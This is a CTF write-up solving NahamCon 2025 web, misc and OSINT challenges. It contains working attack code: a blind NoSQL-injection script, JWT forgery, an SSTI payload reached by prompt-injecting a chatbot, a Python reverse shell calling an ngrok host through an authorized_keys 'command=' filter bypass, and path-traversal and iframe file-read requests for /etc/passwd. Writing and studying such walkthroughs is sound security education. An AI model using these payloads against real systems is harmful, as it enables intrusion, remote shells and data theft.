---
title: "NahamCon CTF 2025"
description: "NahamCon CTF 2025"
summary: "NahamCon CTF 2025 writeup"
categories: ["Writeup"]
tags: ["Web", "Misc", "Osint"]
#externalUrl: ""
date: 2025-05-26
draft: false
cover: ../../post/nahamcon2025/feature.png

authors:
  - winky
---

Solutions for all challenges I solved during and after the CTF.

## SNAD

![image](https://hackmd.io/_uploads/BJTx-BWGxg.png)

This challenge gives us a website

![image](https://hackmd.io/_uploads/BynaZSWMxg.png)

The source is too long so i will summarize it:

![image](https://hackmd.io/_uploads/rJU_LBZfel.png)

* targetPositions: array of object contains x, y, colorHue
* checkFlag(): to check if if all positions in targetPositions have true color and give the flag
* injectSand(x, y, colorHue): inject a color at the position (x, y)

So I will use a simple script to perform the necessary injections.

```js
for (a of targetPositions){ injectSand(a.x, a.y, a.colorHue) }
```

Finally we got the flag

![image](https://hackmd.io/_uploads/B1T6uS-zle.png)

Flag: flag{6ff0c72ad11bf174139e970559d9b5d2}

## No Sequel

![image](https://hackmd.io/_uploads/SyI1OS-zeg.png)

![image](https://hackmd.io/_uploads/SJ_ztB-fll.png)

The website has a search page that allows users to perform regex-based searches.

![image](https://hackmd.io/_uploads/HJ6QKr-zeg.png)

I tried a simple regex search and it gave me a result containing some content maybe the flag.

![image](https://hackmd.io/_uploads/SJyDFHZzgl.png)

So what if i searched a sentence which have a letter 'a' at the beginning ?

![image](https://hackmd.io/_uploads/Bk__YSZzlx.png)

No result! So I tried a letter 'f' and there was a result so maybe there is a 'flag{...}' 

![image](https://hackmd.io/_uploads/HkDttrZGlx.png)

My solve script for blind sql injection: 

```python
import aiohttp
import asyncio
import string

url = "http://challenge.nahamcon.com:32010/search"

ch = string.ascii_letters + string.digits + "{}_"
flag = ""

async def test(session, prefix, ch):
    data = {"query": f"flag: {{$regex:'^{prefix}{ch}.*'}}", "collection": "flags"}
    async with session.post(url, data=data) as resp:
        text = await resp.text()
        return ch if "No results found" not in text else None

async def main():
    global flag
    async with aiohttp.ClientSession() as session:
        for i in range(1, 100):
            tasks = [test(session, flag, c) for c in ch]
            results = await asyncio.gather(*tasks)
            found = False
            for res in results:
                if res:
                    flag += res
                    print(f"Found: {flag}")
                    if res == "}":
                        print("Flag completed!")
                        return
                    found = True
                    break
asyncio.run(main())
```

![image](https://hackmd.io/_uploads/Hy0j2rZMge.png)

flag{4cb8649d9ecb0ec59d1784263602e686}

## Advanced Screening

![image](https://hackmd.io/_uploads/SJ67AS-Mll.png)

![image](https://hackmd.io/_uploads/SJ1I0BWGel.png)

The source code: 

```js
async function requestAccessCode() {
    const email = document.getElementById('email').value;
    if (email) {
        try {
            const response = await fetch('/api/email/', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ email })
            });
            if (response.ok) {
                document.getElementById('modal').classList.add('active');
            } else {
                alert("Failed to send email. Please try again.");
            }
        } catch (error) {
            console.error("Error sending email:", error);
        }
    }
}

async function verifyCode() {
    const code = document.getElementById('code').value;
    if (code.length === 6) {
        try {
            const response = await fetch('/api/validate/', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ code })
            });
            const data = await response.json();
            if (response.ok && data.user_id) {
                const tokenResponse = await fetch('/api/screen-token', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ user_id: data.user_id })
                });
                const tokenData = await tokenResponse.json();
                if (tokenResponse.ok && tokenData.hash) {
                    window.location.href = `/screen/?key=${tokenData.hash}`;
                } else {
                    alert("Failed to retrieve screening token.");
                }
            } else {
                alert("Invalid code. Please try again.");
            }
        } catch (error) {
            console.error("Error verifying code:", error);
        }
    }
}
```

It requires a 6 digits code to continue but I can't get it. I try to use the /api/screen-token to fuzz and yeah there is a user_id 7 gives me the hash token to access the /screen page

![image](https://hackmd.io/_uploads/SysMk8-zll.png)

![image](https://hackmd.io/_uploads/SJDVJIbfxg.png)

Flag: flag{f0b1d2a98cd92d728ddd76067f959c31}

## TMCB

![image](https://hackmd.io/_uploads/S1iFpU-zex.png)

The website has many checkboxes that we need to click all of them to get the flag

![image](https://hackmd.io/_uploads/SJZhaUbfgx.png)

I notice how the data transfer and it uses websocket. But, it uses array of numbers?

![image](https://hackmd.io/_uploads/BkappIZzll.png)

I try to fuzz a little bit and yeah we can use the array to append as many as checkboxes we want

![image](https://hackmd.io/_uploads/HkZkAUbfxx.png)

![image](https://hackmd.io/_uploads/rkelRI-fxe.png)

My solve script: 

```python
import asyncio
import websockets
import json

async def send_message():
    uri = "ws://challenge.nahamcon.com:31990/ws"
    numbers = []
    for i in range(1, 2000000):
        numbers.append(i)
    async with websockets.connect(uri) as websocket:
        message = {"action": "check", "numbers": numbers}
        await websocket.send(json.dumps(message))
        print(f"Sent: {message}")
        response = await websocket.recv()
        print(f"Received: {response}")
asyncio.run(send_message())
```

![image](https://hackmd.io/_uploads/BkaTCL-zee.png)

Flag: flag{7d798903eb2a1823803a243dde6e9d5b}

## Infinite Queue

![image](https://hackmd.io/_uploads/ry_ZJPZMee.png)

![image](https://hackmd.io/_uploads/SJq-EvbGge.png)

After I entered the email there was a JWT token in localStorage

![image](https://hackmd.io/_uploads/rylXVv-Ggg.png)

try to modify the JWT and refresh it gives us an error which contains JWT key

![image](https://hackmd.io/_uploads/H1eINv-Mgg.png)

"JWT_SECRET": "4A4Dmv4ciR477HsGXI19GgmYHp2so637XhMC". Now we can easily use this token to generate a new JWT which the queue_time we want.

![image](https://hackmd.io/_uploads/B19qNvWMgg.png)

![image](https://hackmd.io/_uploads/SJI24w-zgl.png)

Flag: flag{b1bd4795215a7b81699487cc7e32d936}

## Method In The Madness

![image](https://hackmd.io/_uploads/H1H1SDZMge.png)

![image](https://hackmd.io/_uploads/SymWrvZzex.png)

![image](https://hackmd.io/_uploads/B1RbrD-zlx.png)

i tried to click checkout and it checked my first checkbox

![image](https://hackmd.io/_uploads/HJDGSPWfll.png)

Try to use another method and it gives another result

![image](https://hackmd.io/_uploads/rylVSwWMxl.png)

![image](https://hackmd.io/_uploads/BJWSrvWfxx.png)

All the methods to solve this challenge: GET, POST, DELETE, PUT, OPTIONS, PATCH

![image](https://hackmd.io/_uploads/SkShSD-fxe.png)

## My first CTF

![image](https://hackmd.io/_uploads/rJciIPbMle.png)

![image](https://hackmd.io/_uploads/Hy9gwDbMxx.png)

After using dirsearch on this website, I found /flag.txt endpoint

![image](https://hackmd.io/_uploads/Hk1tvvWzex.png)

Try to access it but there is nothing 

![image](https://hackmd.io/_uploads/HyqmPDWGxx.png)

Analyze the hint, it uses caesar cipher to encode the challenge title

![image](https://hackmd.io/_uploads/HkVMPwWMee.png)

So i tried to encode flag.txt -> gmbh.uyu

![image](https://hackmd.io/_uploads/SJ_8DwbMle.png)

Flag: flag{b67779a5cfca7f1dd120a075a633afe9}

## My Second CTF

Fuzzing challenge like the first one but now it requires params

```python
import asyncio
import aiohttp
from urllib.parse import quote

BASE = "http://challenge.nahamcon.com:30808/FUZZ"
WORDLIST = "wordlist.txt"
MAX_CONCURRENT = 50

def caesar(text, shift):
    def shift_char(c):
        if c.islower():
            return chr((ord(c) - 97 + shift) % 26 + 97)
        if c.isupper():
            return chr((ord(c) - 65 + shift) % 26 + 65)
        if c.isdigit():
            return chr((ord(c) - 48 + shift) % 10 + 48)
        return c
    return ''.join(shift_char(c) for c in text)

async def send(session, url, sem):
    async with sem:
        try:
            async with session.get(url, timeout=10) as r:
                if r.status in [200, 301, 302, 403]:
                    print(url)
        except: pass

async def main():
    sem = asyncio.Semaphore(MAX_CONCURRENT)
    words = [w.strip() for w in open(WORDLIST) if w.strip()]
    async with aiohttp.ClientSession() as session:
        tasks = []
        for word in words:
            for i in range(1, 21):
                for s, tag in [(i, f"+{i}"), (-i, f"-{i}")]:
                    shifted = caesar(word, s)
                    url = BASE.replace("FUZZ", quote(shifted))
                    tasks.append(send(session, url, sem))
        await asyncio.gather(*tasks)

asyncio.run(main())
```

![image](https://hackmd.io/_uploads/SkeetwbGxx.png)

After finding the endpoint I try to change the code to fuzz the params

```python
BASE = "http://challenge.nahamcon.com:30808/fgdwi/?FUZZ"

async def send(session, url, sem):
    async with sem:
        try:
            async with session.get(url, timeout=10) as r:
                text = await r.text()
                if r.status in [200, 301, 302, 403] and "flag" in text:
                    print(url, r.status, r.headers, text)
        except: pass
```

![image](https://hackmd.io/_uploads/H1qAYv-zgl.png)

Flag: flag{9078bae810c524673a331aeb58fb0ebc}

## The Mission - Flag #1

![image](https://hackmd.io/_uploads/S1DE5P-Gxe.png)

Check robots.txt

![image](https://hackmd.io/_uploads/By4B9v-zle.png)

## The Mission - Flag #4

I notice it uses graphql api

![image](https://hackmd.io/_uploads/BJ5YqPbflx.png)

try to inject some introspection and we have the users query

![image](https://hackmd.io/_uploads/r1Hh9vbMxe.png)

Use it: ```"query":"\n {\n users{\n id \n username\n email\n }\n }\n"```

![image](https://hackmd.io/_uploads/Bk6dsD-Mgl.png)

Flag: flag_4{253a82878df615bb9ee32e573dc69634}

## The Mission - Flag #6

![image](https://hackmd.io/_uploads/H1kTivWGlx.png)

Try to fuzz the chatbot  using some prompt injection : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Prompt%20Injection/README.md

![image](https://hackmd.io/_uploads/H13j3wZGel.png)

Adding some SSTI payload and yeah it has this bug

![image](https://hackmd.io/_uploads/Bk1R3DWGxe.png)

Final payload

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }}
```

Flag: flag_6{9c2001f18f3b997187c9eb6d8c96ba60}

## Quartet

![image](https://hackmd.io/_uploads/HJjIldWzll.png)

It gives us four parts of a zip file try to concat them and unzip to find the hidden data. My solve code:

```python
import subprocess
subprocess.run(["touch", "quartet.zip"])

for i in range(1, 5):
    print(i)
    with open(f"quartet.z0{i}", "rb") as f:
        with open("quartet.zip", "ab") as g:
            g.write(f.read())

subprocess.run(["unzip", "quartet.zip"])
pattern = "flag{.*}"
with open("quartet.jpeg", "rb") as f:
    content = f.read()
    import re
    match = re.search(pattern.encode(), content)
    print(match.group(0).decode())
```

![image](https://hackmd.io/_uploads/HkZ8z_Wzee.png)

Flag: flag{8f667b09d0e821f4e14d59a8037eb376}

## Flagdle

![image](https://hackmd.io/_uploads/HJnDXO-Mxx.png)

![image](https://hackmd.io/_uploads/SyMcQubzgx.png)

My solve code:

```python
import requests
import string
s = ''
ch = string.printable
for i in range(0, 32):
    for j in ch:
        guess = '0' * 32
        guess = 'flag{' + guess[:i] + j + guess[i+1:] + '}'
        json_data = {
            'guess': guess,
        }
        response = requests.post('http://challenge.nahamcon.com:31399/guess', headers=headers, json=json_data)
        print(response.json())
        a = (response.json()['result'])
        if a[i] == "🟩":
            print(json_data['guess'])
            s += j
            print(s)
            break
```

![image](https://hackmd.io/_uploads/S1ax4_Wfgx.png)

Flag: flag{bec42475a614b9c9ba80d0eb7ed258c5}

## The Martian

![image](https://hackmd.io/_uploads/SJUEEOZMgx.png)

Try to extract data from the given file

![image](https://hackmd.io/_uploads/HysLEuWfgx.png)

there is a jpeg image file so i try to view it 

![image](https://hackmd.io/_uploads/HkKvV_-Geg.png)

![image](https://hackmd.io/_uploads/BkuuEubzee.png)

Flag: flag{0db031ac265b3e6538aff0d9f456004f}

## SSH Key Tester

![image](https://hackmd.io/_uploads/HyHqVuWMxg.png)

Source code: 

```python
#!/usr/bin/env python3
import os
import base64
import binascii as bi
import tempfile
import traceback
import subprocess
import sys

from flask import Flask, request
import random

sys.path.append("../")

app = Flask(__name__)

app.config['UPLOAD_FOLDER'] = '/tmp'
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # 16 MB


@app.route("/", methods=["GET", "POST"])
def run():
    print(request.files)
    if len(request.files) != 2:
        return "Please submit both private and public key to test.", 400

    if not request.files.get("id_rsa"):
        return "`id_rsa` file not found.", 400
    if not request.files.get("id_rsa.pub"):
        return "`id_rsa.pub` file not found.", 400
        

    privkey = request.files.get("id_rsa").read()
    pubkey = request.files.get("id_rsa.pub").read()
    if pubkey.startswith(b"command="):
        return "No command= allowed!", 400
    os.system("service ssh start")
    userid = "user%d" % random.randint(0, 1000)
    os.system("useradd %s && mkdir -p /home/%s/.ssh" % (userid, userid))
    with open("/tmp/id_rsa", "wb") as fd:
        fd.write(privkey)
    os.system("chmod 0600 /tmp/id_rsa")
    with open("/home/%s/.ssh/authorized_keys" % userid, "wb") as fd:
        fd.write(pubkey)
    os.system("timeout 2 ssh -o StrictHostKeyChecking=no -i /tmp/id_rsa %s@localhost &" % userid)
    return "Keys pass the checks.", 200


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080, debug=True)
```

https://man.openbsd.org/sshd#:~:text=two%20is%20applied.-,command%3D%22command%22,-Specifies%20that%20the

It banned the "command=" in the public key? So I try to research about it

```python
if pubkey.startswith(b"command="):
    return "No command= allowed!", 400
```

So it's something like executing a linux shell command when upload the public-key

![image](https://hackmd.io/_uploads/ryB7S_bMge.png)

But how to bypass the filter? I try to add the space before it and it works

`command=` ❌
` command=` ✅

Now just add the reverse shell to the command 

```
 command="python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"0.tcp.ap.ngrok.io\",13605));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")'" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCGp/UXlr5ntDQuvWKhUTmW31Sm8hj3maS6oOhRtq5os+2maZ3/bCKxze3pya9CmfsFD95K/IMLwLWiu8ar5HUl4RLoEJU9/1bOeCB14Uv7O8r2KFFIRDf8Xh7UBrBPJnVROtwKGt54Kx7UA2h5GGy3xMFsWFrkcUjvINxLEr2lt2wS897zN2UuXDpgquba1plVxIVrU8ATa3Tgxo1g2yrqfbwIcdf2bbY/Qqvlgkm6i0W2fiZEMa9H40iLLzs8jQaBlPINcoEzrvtbT8xHCR1gap8Q+yNEfFcRmZbv6KOE3XaKu+NGAKvvLLlCPeaJVu7IVQNz97qgCh2eLy1n6a8hre47Yiig03nSegPuOlL94l3AIqaCARbum+5V/8/n4bgU1OFkraGwFbhoz3flFyUB4AIIYOKRUKPRWmAtbe1Clp64pEYH4XNg0hokyLvU3WY3to4jFGGSH7kZJRLZiTaVGF/TWXEX21eQ9q+iFn4UAjAki4JZqfFWayNLfbZrudU= attacker@exploit
```

```bash
curl -X POST -F "id_rsa=@./exploit_key" -F "id_rsa.pub=@./exploit_key.pub" http://challenge.nahamcon.com:31910/
```

And we finally get the shell of this challenge system: 

![image](https://hackmd.io/_uploads/BkXQIdbfgg.png)

![image](https://hackmd.io/_uploads/r11u8ubzex.png)

Flag: flag{786ad609004438adfb5d33aeaa507c66}

## I Want PIE

![image](https://hackmd.io/_uploads/HkTKIO-Mlg.png)

![image](https://hackmd.io/_uploads/rkx3Uu-Mll.png)

Try to upload a file and it requires a ppm file

![image](https://hackmd.io/_uploads/Hy0nUdWMee.png)

I try to research about it and yeah there is a thing like programming language over image called Piet

![image](https://hackmd.io/_uploads/Hk4gv_-Mll.png)

Try to use this tool https://github.com/sebbeobe/piet_message_generator to generate an image that suits the problem statement

![image](https://hackmd.io/_uploads/ByZswObMlx.png)

Reupload it: 

![image](https://hackmd.io/_uploads/rk52w_WMgg.png)

Flag: flag{7deea6641b672696de44e60611a8a429}

## Sending Mixed Signals

![image](https://hackmd.io/_uploads/HkCkdubzgg.png)

There are 3 questions about some commnunication app 

![image](https://hackmd.io/_uploads/BJtf_uWzex.png)

My teammate @L1ttl3 found it in https://github.com/micahflee/TM-SGNL-Android. The first part is 

![image](https://hackmd.io/_uploads/ryPEKdZzxe.png)

Part1: enRR8UVVywXYbFkqU#QDPRkO

I try to look around the app's owner page: https://micahflee.com/heres-the-source-code-for-the-unofficial-signal-app-used-by-trump-officials/#:~:text=moti%40telemessage.com And yeah i have the second part

Part2: moti@telemessage.com

My teammate found the last part in the commit history

![image](https://hackmd.io/_uploads/ryKUq_Wfle.png)

Part3: Release_5.4.11.20

![image](https://hackmd.io/_uploads/SJz95u-fgl.png)

Flag: flag{96143e18131e48f4c937719992b742d7}

So these are all challengs I solved and next is some web challenges I solve after the competition ends. 

## My Third CTF

![image](https://hackmd.io/_uploads/S1rsidWzeg.png)

Fuzzing like my second one but it's like /rot1/rot2/rot3/rot4. My solve code: 

```python
import asyncio
import aiohttp
from urllib.parse import quote

BASE = "http://challenge.nahamcon.com:31732/FUZZ"
WORDLIST = "wordlist.txt"
MAX_CONCURRENT = 50
MAX_DEPTH = 6

def caesar(text, shift):
    def shift_char(c):
        if c.islower():
            return chr((ord(c) - 97 + shift) % 26 + 97)
        if c.isupper():
            return chr((ord(c) - 65 + shift) % 26 + 65)
        if c.isdigit():
            return chr((ord(c) - 48 + shift) % 10 + 48)
        return c
    return ''.join(shift_char(c) for c in text)

async def send(session, url, sem):
    global BASE
    async with sem:
        try:
            async with session.get(url, timeout=10) as r:
                if r.status in [200, 301, 302, 403]:
                    BASE = url + "/FUZZ"
                    print(BASE)
        except:
            pass

async def main():
    words = [w.strip() for w in open(WORDLIST) if w.strip()]
    async with aiohttp.ClientSession() as session:
        for depth in range(MAX_DEPTH):
            base = BASE
            sem = asyncio.Semaphore(MAX_CONCURRENT)
            tasks = []
            for word in words:
                for i in range(1, 21):
                    for s in [i, -i]:
                        shifted = caesar(word, s)
                        url = base.replace("FUZZ", quote(shifted))
                        tasks.append(send(session, url, sem))
            await asyncio.gather(*tasks)
            if base == BASE:
                break

asyncio.run(main())
```

![image](https://hackmd.io/_uploads/B1AG-tWfle.png)

Flag: flag{afd87cae63c08a57db7770b4e52081d3}

## Outcast

![image](https://hackmd.io/_uploads/rywNZtWGex.png)

![image](https://hackmd.io/_uploads/B1aLWtbzxl.png)

After using dirsearch to find something sus, I have a test page like this

![image](https://hackmd.io/_uploads/B14ObYWzex.png)

And the source code of an APICaller

```php
<?php

class APICaller {
	private $url =  'http://localhost/api/';
	private $path_tmp = '/tmp/';
	private $id;

	public function __construct($id, $path_tmp = '/tmp/') {
		$this->id = $id;
		$this->path_tmp = $path_tmp;

	}

	public function __call($apiMethod, $data = array()) {
		$url = $this->url . $apiMethod;
		$data['id'] = $this->id;

		foreach ($data as $k => &$v) {
			if ( ($v) && (is_string($v)) && str_starts_with($v, '@') ) {
				$file = substr($v, 1);

				if ( str_starts_with($file, $this->path_tmp) ) {
					$v = file_get_contents($file);
				}
			}
			if (is_array($v) || is_object($v)) {
				$v = json_encode($v);
			}
		}

		// Call the API server using the given configuraions
		$ch = curl_init($url);
		curl_setopt_array($ch, array(
			CURLOPT_POST           => true,
			CURLOPT_POSTFIELDS     => $data,
			CURLOPT_RETURNTRANSFER => true,
			CURLOPT_HTTPHEADER     => array('Accept: application/json'),
		));
		$response = curl_exec($ch);
		$error  = curl_error($ch);
		
		curl_close($ch);

		if (!empty($error)) {
			throw new Exception($error);
		}

		return $response;
	}
}
```

I found two bugs file inclusion and client side path traversal

`file=@/tmp/../../../../flag.txt&file2=@/tmp/1`

![image](https://hackmd.io/_uploads/S1_2WtbMex.png)

![image](https://hackmd.io/_uploads/BksQGYWGxg.png)

So I try to use username as the params to /login/ page so that the username value will be display in the source code. (missing only this step 😢)

![image](https://hackmd.io/_uploads/rkLIGY-Mge.png)

Flag: FLAG{ch41ning_bug$_1s_W0nd3rful!}

## Access all areas

![image](https://hackmd.io/_uploads/B1Y_YFWfll.png)

The challenge gives me a website

![image](https://hackmd.io/_uploads/BJ19YK-zeg.png)

The log of this website

![image](https://hackmd.io/_uploads/B1wV5t-fxl.png)

Try path traversal fuzzing but it requires .log file

![image](https://hackmd.io/_uploads/SksLqKWfgl.png)

I find a file called /var/log/nginx/access.log to save the access history and this is the only page where we can insert arbitrary content via params



![image](https://hackmd.io/_uploads/BJF25FbGxx.png)

So what we can exploit? After read this article, I think there is a ssrf bug : https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-pdf-generators-a-complete-guide-to-finding-ssrf-vulnerabilities-in-pdf-generators

Try to add some iframe tag but the url is url-encoded `http://challenge.nahamcon.com:32725/api/log.php?log=../../../../var/log/nginx/access.log&hehe=<iframe src='file:///etc/passwd'/>`

![image](https://hackmd.io/_uploads/B16ViKWfxl.png)

Try to use tcp to send data so that it won't be url-encoded

```bash
printf "GET /api/log.php?log=../../../../var/log/nginx/access.log&hehe=<iframe src='file:///etc/passwd'></iframe> HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n" | nc challenge.nahamcon.com 32725
```

and yeah we finally have the file inclusion bug

![image](https://hackmd.io/_uploads/SkRsjKWMlg.png)

Now we try to get the flag maybe it's in flag.txt or /flag.txt

```bash
printf "GET /api/log.php?log=../../../../var/log/nginx/access.log&hehe=<iframe src='file:///flag.txt'></iframe> HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n" | nc challenge.nahamcon.com 32725
```

![image](https://hackmd.io/_uploads/SyQ72tWfeg.png)
## Talk Tuah 

Updating...